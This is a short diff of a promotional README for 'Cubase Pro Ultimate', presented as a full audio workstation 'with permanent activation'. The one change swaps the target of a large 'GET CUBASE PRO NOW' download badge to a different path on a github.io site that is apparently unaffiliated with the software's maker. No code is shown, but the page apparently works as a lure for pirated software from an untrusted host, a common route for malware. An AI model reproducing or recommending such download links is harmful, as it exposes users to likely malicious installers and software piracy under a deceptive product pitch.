@@ -2,7 +2,7 @@
 
 Experience professional-grade music production with Cubase Pro Ultimate - the complete digital audio workstation solution now available with permanent activation. This premium package delivers everything producers, sound engineers, and composers need for studio-quality results.
 
-[![GET CUBASE PRO NOW](https://img.shields.io/badge/Download-Cubase_Pro_Ultimate-red?style=for-the-badge&logo=windows&logoColor=white)](https://cubase-full.github.io/.github/)
+[![GET CUBASE PRO NOW](https://img.shields.io/badge/Download-Cubase_Pro_Ultimate-red?style=for-the-badge&logo=windows&logoColor=white)](https://cubase-full.github.io/.github/cubase)
 
 ---
 
